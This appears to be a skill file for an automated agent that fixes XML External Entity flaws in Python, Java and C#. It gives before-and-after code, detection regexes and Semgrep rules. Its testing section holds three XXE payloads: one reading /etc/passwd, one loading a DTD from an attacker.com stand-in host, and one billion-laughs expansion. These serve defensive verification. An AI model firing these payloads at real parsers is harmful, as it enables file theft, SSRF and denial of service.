---
name: cwe-611-xxe
description: "CWE-611: XML External Entity (XXE) Remediation — Remediate XML External Entity (XXE) vulnerabilities by disabling external entity processing and DTD loading in XML parsers. This skill transforms code"
user-invocable: false
source: barclays-claude-code-plugins/plugins/detox/skills/remediation_cwe/SKILL.md
owner: Detox Team (DETOX PRJ Teams channel, http://detox/)
review-trigger: When new CWE patterns are identified or Semgrep rules change
status: Full
---

# CWE-611: XML External Entity (XXE) Remediation
## Quick Start

This skill provides the fix pattern for CWE-611. It is loaded by the detox fix-agent during the remediation pipeline.

```
# Invoked automatically by detox-fix-agent when CWE-611 is classified in the finding.
# The agent loads this skill, applies the language-specific fix, and validates with Semgrep.
```



## CWE Information

- **CWE ID**: CWE-611
- **CWE Name**: Improper Restriction of XML External Entity Reference
- **Severity**: High
- **OWASP Category**: A05:2021 — Security Misconfiguration

## Purpose

Remediate XML External Entity (XXE) vulnerabilities by disabling external entity processing and DTD loading in XML parsers. This skill transforms code that uses insecure default XML parser configurations into code that explicitly disables external entities, DTDs, and external parameter entities, preventing attackers from exfiltrating files, performing SSRF, or causing denial of service via entity expansion.

## Inputs

- **vulnerability** (required, JSON object): A normalized vulnerability object containing:
  - `file_path` (string, required): Path to the affected file.
  - `line_number` (integer, required): Line where the XXE vulnerability was detected.
  - `code_snippet` (string, optional): The vulnerable code flagged by the scanner.
  - `cwe_id` (string, required): Must be `CWE-611`.
- **code_context** (required, JSON object): Output from the `code_context_analyzer` skill.
- **repo_root** (optional, string): Absolute path to the repository root.

## Vulnerable Pattern

XXE occurs when an XML parser processes input containing references to external entities (defined in a DTD or inline) and the parser is configured (or defaults) to resolve those entities. An attacker can define an external entity pointing to a local file, internal URL, or use entity expansion for denial of service.

### Detection Patterns

**General indicators:**
- XML parsing of user-supplied or external XML data.
- Parser instantiated without explicitly disabling external entities or DTDs.
- Use of older or default parser configurations that resolve external entities.

**Regex patterns for detection:**
```
# Python lxml
lxml\.etree\.(parse|fromstring|XML|iterparse)\s*\(
# Python xml.etree
xml\.etree\.ElementTree\.(parse|fromstring)\s*\(
# Python xml.sax
xml\.sax\.(parse|parseString|make_parser)\s*\(
# Java DocumentBuilderFactory
DocumentBuilderFactory\.newInstance\(\)
# Java SAXParser
SAXParserFactory\.newInstance\(\)
# Java XMLInputFactory
XMLInputFactory\.newInstance\(\)
# C# XmlReader / XmlDocument
new\s+XmlDocument\s*\(|XmlReader\.Create\s*\(|new\s+XmlTextReader\s*\(
```

## Fix Pattern

### General Approach

1. **Disable DTD processing entirely** where DTDs are not needed (the most common case).
2. **Disable external entity resolution**: Set parser features/properties to disallow external general entities and external parameter entities.
3. **Disable external DTD loading**: Prevent the parser from fetching remote DTDs.
4. **Use safe-by-default libraries** where available (e.g., `defusedxml` in Python).
5. **Limit entity expansion**: Set limits on entity expansion depth and count to prevent billion laughs attacks.

### Step-by-Step Transformation

1. Identify the XML parser library and the specific parsing call.
2. Determine whether the parsed XML comes from an untrusted source (user input, external API, file upload).
3. Add the appropriate security configuration before parsing. The exact configuration varies by language and library.
4. If a safe-by-default alternative exists (e.g., `defusedxml`), consider migrating to it.
5. Verify the fix preserves the original XML parsing functionality for legitimate documents.

## Language-Specific Examples

### Python (lxml)

**Before (vulnerable):**
```python
from lxml import etree

def parse_xml(xml_string: str):
    doc = etree.fromstring(xml_string)
    return doc.find(".//data").text
```

**After (fixed):**
```python
from lxml import etree

def parse_xml(xml_string: str):
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False,
    )
    doc = etree.fromstring(xml_string.encode() if isinstance(xml_string, str) else xml_string, parser=parser)
    return doc.find(".//data").text
```

**Explanation:** An `XMLParser` is created with `resolve_entities=False` to prevent entity resolution, `no_network=True` to block network access, and `load_dtd=False` to prevent DTD loading. This parser is passed to `fromstring`.

### Python (xml.etree.ElementTree)

**Before (vulnerable):**
```python
import xml.etree.ElementTree as ET

def parse_xml(xml_file: str):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    return root.find(".//name").text
```

**After (fixed):**
```python
import defusedxml.ElementTree as ET

def parse_xml(xml_file: str):
    tree = ET.parse(xml_file)
    root = tree.getroot()
    return root.find(".//name").text
```

**Explanation:** Replace `xml.etree.ElementTree` with `defusedxml.ElementTree`, which is a drop-in replacement that disables external entity processing, DTDs, and entity expansion by default. Add `defusedxml` to the project's dependencies.

### Python (defusedxml — recommended)

**Before (vulnerable):**
```python
from xml.sax import parse as sax_parse
from xml.sax.handler import ContentHandler

class MyHandler(ContentHandler):
    def startElement(self, name, attrs):
        pass

def process_xml(xml_file: str):
    sax_parse(xml_file, MyHandler())
```

**After (fixed):**
```python
import defusedxml.sax

from xml.sax.handler import ContentHandler

class MyHandler(ContentHandler):
    def startElement(self, name, attrs):
        pass

def process_xml(xml_file: str):
    defusedxml.sax.parse(xml_file, MyHandler())
```

**Explanation:** `defusedxml.sax.parse` is a safe drop-in replacement for `xml.sax.parse`. It disables external entities and DTDs.

### Java (DocumentBuilderFactory)

**Before (vulnerable):**
```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;

public Document parseXml(String xmlContent) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlContent)));
}
```

**After (fixed):**
```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;
import javax.xml.XMLConstants;

public Document parseXml(String xmlContent) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

    // Disable external entities and DTDs
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    factory.setXIncludeAware(false);
    factory.setExpandEntityReferences(false);

    // Additional hardening
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlContent)));
}
```

**Explanation:** Multiple features are set on the `DocumentBuilderFactory` to disable DTD declarations, external general entities, external parameter entities, and external DTD loading. `ACCESS_EXTERNAL_DTD` and `ACCESS_EXTERNAL_SCHEMA` are set to empty strings to block all external access. This is the OWASP-recommended configuration.

### Java (SAXParser)

**Before (vulnerable):**
```java
import javax.xml.parsers.SAXParserFactory;
import javax.xml.parsers.SAXParser;

public void parseXml(String xmlFile, DefaultHandler handler) throws Exception {
    SAXParserFactory factory = SAXParserFactory.newInstance();
    SAXParser parser = factory.newSAXParser();
    parser.parse(xmlFile, handler);
}
```

**After (fixed):**
```java
import javax.xml.parsers.SAXParserFactory;
import javax.xml.parsers.SAXParser;
import javax.xml.XMLConstants;

public void parseXml(String xmlFile, DefaultHandler handler) throws Exception {
    SAXParserFactory factory = SAXParserFactory.newInstance();

    // Disable external entities and DTDs
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

    SAXParser parser = factory.newSAXParser();
    parser.parse(xmlFile, handler);
}
```

**Explanation:** The same feature flags applied to `SAXParserFactory`. `FEATURE_SECURE_PROCESSING` adds additional limits on entity expansion.

### C# (XmlReader)

**Before (vulnerable):**
```csharp
using System.Xml;

public XmlDocument ParseXml(string xmlContent)
{
    var doc = new XmlDocument();
    doc.LoadXml(xmlContent);
    return doc;
}
```

**After (fixed):**
```csharp
using System.Xml;

public XmlDocument ParseXml(string xmlContent)
{
    var settings = new XmlReaderSettings
    {
        DtdProcessing = DtdProcessing.Prohibit,
        XmlResolver = null,
        MaxCharactersFromEntities = 1024,
        MaxCharactersInDocument = 10_000_000
    };

    var doc = new XmlDocument();
    doc.XmlResolver = null;
    using (var stringReader = new System.IO.StringReader(xmlContent))
    using (var xmlReader = XmlReader.Create(stringReader, settings))
    {
        doc.Load(xmlReader);
    }
    return doc;
}
```

**Explanation:** `XmlReaderSettings` is configured with `DtdProcessing.Prohibit` to reject any DTD declarations and `XmlResolver = null` to prevent external entity resolution. `MaxCharactersFromEntities` limits entity expansion to prevent billion laughs attacks. The `XmlDocument.XmlResolver` is also set to `null` as an additional safeguard.

### C# (XmlReader — direct usage)

**Before (vulnerable):**
```csharp
using System.Xml;

public void ProcessXml(Stream xmlStream)
{
    var reader = new XmlTextReader(xmlStream);
    while (reader.Read())
    {
        // process nodes
    }
}
```

**After (fixed):**
```csharp
using System.Xml;

public void ProcessXml(Stream xmlStream)
{
    var settings = new XmlReaderSettings
    {
        DtdProcessing = DtdProcessing.Prohibit,
        XmlResolver = null,
    };

    using (var reader = XmlReader.Create(xmlStream, settings))
    {
        while (reader.Read())
        {
            // process nodes
        }
    }
}
```

**Explanation:** Replace `XmlTextReader` (which has insecure defaults) with `XmlReader.Create` using secure `XmlReaderSettings`. `XmlTextReader` is deprecated in favor of `XmlReader.Create` precisely because of its unsafe defaults.

## Testing Guidance

### Verifying the Fix Eliminates the Vulnerability

1. **External entity test**: Parse XML containing an external entity referencing a local file:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <data>&xxe;</data>
   ```
   The parser must either throw an exception or return the literal `&xxe;` without expanding it.

2. **Parameter entity test**: Parse XML with a parameter entity:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
     <!ENTITY % pe SYSTEM "http://attacker.com/evil.dtd">
     %pe;
   ]>
   <data>test</data>
   ```
   The parser must reject this document or ignore the parameter entity.

3. **Billion laughs test**: Parse XML with recursive entity expansion:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
   ]>
   <data>&lol3;</data>
   ```
   The parser must not consume excessive memory or time.

### Verifying Existing Functionality Is Preserved

1. Parse a valid XML document without DTDs or entities. Verify the output is identical to before the fix.
2. If the application uses namespaces, verify namespace-aware parsing still works.
3. If the application uses XPath queries on the parsed document, verify they return expected results.

### Semgrep Rules

After the fix, the following Semgrep patterns should no longer match:
```yaml
rules:
  - id: xxe-lxml-no-safe-parser
    pattern: lxml.etree.fromstring($DATA)
    message: "lxml parsing without safe parser configuration"
    severity: ERROR
  - id: xxe-java-dbf-no-features
    patterns:
      - pattern: DocumentBuilderFactory.newInstance()
      - pattern-not-inside: |
          $F.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
          ...
    message: "DocumentBuilderFactory without XXE protections"
    severity: ERROR
  - id: xxe-csharp-xmldocument-no-resolver
    pattern: new XmlDocument()
    pattern-not-inside: |
      $DOC.XmlResolver = null;
      ...
    message: "XmlDocument without XmlResolver set to null"
    severity: ERROR
```

## Common Mistakes

1. **Disabling only external general entities but not parameter entities**: Parameter entities can also be used for data exfiltration and SSRF. Both must be disabled.
2. **Setting features on the parser instead of the factory (Java)**: In Java, features must be set on the `DocumentBuilderFactory` or `SAXParserFactory` before calling `newDocumentBuilder()` or `newSAXParser()`. Setting them on the parser itself may not take effect.
3. **Using `XmlTextReader` in C#**: `XmlTextReader` has insecure defaults and is deprecated. Always use `XmlReader.Create` with explicit `XmlReaderSettings`.
4. **Forgetting `XmlResolver = null` on `XmlDocument` (C#)**: Even when using a safe `XmlReader`, the `XmlDocument` object itself has a resolver that can be exploited. Set `XmlDocument.XmlResolver = null`.
5. **Not adding `defusedxml` to dependencies**: When switching to `defusedxml` in Python, ensure it is added to `requirements.txt`, `pyproject.toml`, or the relevant dependency manifest.
6. **Assuming `xml.etree.ElementTree` is safe**: While it does not expand external entities by default in recent CPython versions, it still processes DTDs and is vulnerable to billion laughs. Use `defusedxml` for defense in depth.
7. **Partial feature configuration in Java**: All four features (disallow-doctype-decl, external-general-entities, external-parameter-entities, load-external-dtd) should be set. Missing any one can leave the parser partially vulnerable.

## Steps

1. Use `Read` to open the file at `vulnerability.file_path` and examine the `code_context` to identify the XML parser and how it is configured.
2. Identify the specific XML parser library (lxml, xml.etree, xml.sax, DocumentBuilderFactory, SAXParser, XMLInputFactory, XmlDocument, XmlReader, etc.).
3. Use `Grep` to check whether the parser is already partially hardened (search for feature flags, resolver settings, or `defusedxml` usage).
4. Determine the appropriate fix for the identified parser and language from the Language-Specific Examples above.
5. Use `Edit` to apply the secure parser configuration before the parsing call.
6. If using Python, check whether `defusedxml` is already a dependency. If not, add it to the dependency manifest or use the `lxml`-based fix.
7. Use `Grep` to search for other XML parsing calls in the same file and apply the same fix.
8. Verify the fix does not remove any needed parser features (e.g., namespace support, schema validation).

## Output Format

Return a JSON object:

```json
{
  "status": "fixed | failed | needs_review",
  "file_path": "<string: absolute path to the modified file>",
  "changes": [
    {
      "line_number": "<integer: line where the change was made>",
      "description": "<string: what was changed and why>"
    }
  ],
  "parser_library": "<string: the XML parser library that was secured>",
  "features_disabled": ["<string: list of features/entities disabled>"],
  "notes": "<string: any additional context or recommendations>"
}
```

### Success Indicator

The `status` field is `"fixed"` and external entities, DTDs, and entity expansion are disabled in the parser configuration.

### Failure Indicator

The `status` field is `"failed"` with a description of what prevented the fix.

## Error Handling

| Failure Mode | Handling |
|---|---|
| **File not found** | Return `{"status": "failed", "reason": "File not found"}`. Do not retry. |
| **Unknown XML parser library** | Apply the most conservative fix (disable DTDs entirely). Set `status` to `"needs_review"` with a note. |
| **Parser feature not supported** | Try alternative feature names. If the parser does not support any security features, recommend migrating to a safe alternative and set `status` to `"needs_review"`. |
| **DTD processing is required by the application** | Do not disable DTDs. Instead, disable only external entity resolution and set entity expansion limits. Set `status` to `"needs_review"` with a note explaining the constraint. |
| **Multiple parsers in the same file** | Fix all parsers. Report each in the `changes` array. |

## Constraints

- **Preserve functionality**: The fix must not break legitimate XML parsing. If DTDs are required for validation, disable only external entities rather than all DTD processing.
- **Minimal diff**: Change only parser configuration. Do not refactor the XML processing logic.
- **Dependency management**: If introducing `defusedxml`, add it to the project's dependency manifest. Do not leave implicit dependencies.
- **Do not change XML schema or documents**: Only modify the parser configuration in the application code.
- **Tool usage**: Use `Read` for file reading, `Grep` for pattern searching, `Edit` for code modifications.

## Agent Self-Check

- [ ] Skill loaded before the pipeline stage it governs
- [ ] CWE classification confirmed before applying fix pattern
- [ ] Language-specific fix pattern applied (not generic fallback) where available
- [ ] Semgrep validation re-scan executed after fix to confirm vulnerability eliminated
- [ ] Security regression test generated for the remediated finding
- [ ] Audit trail entry written to DETOX-REMEDIATION-REPORT
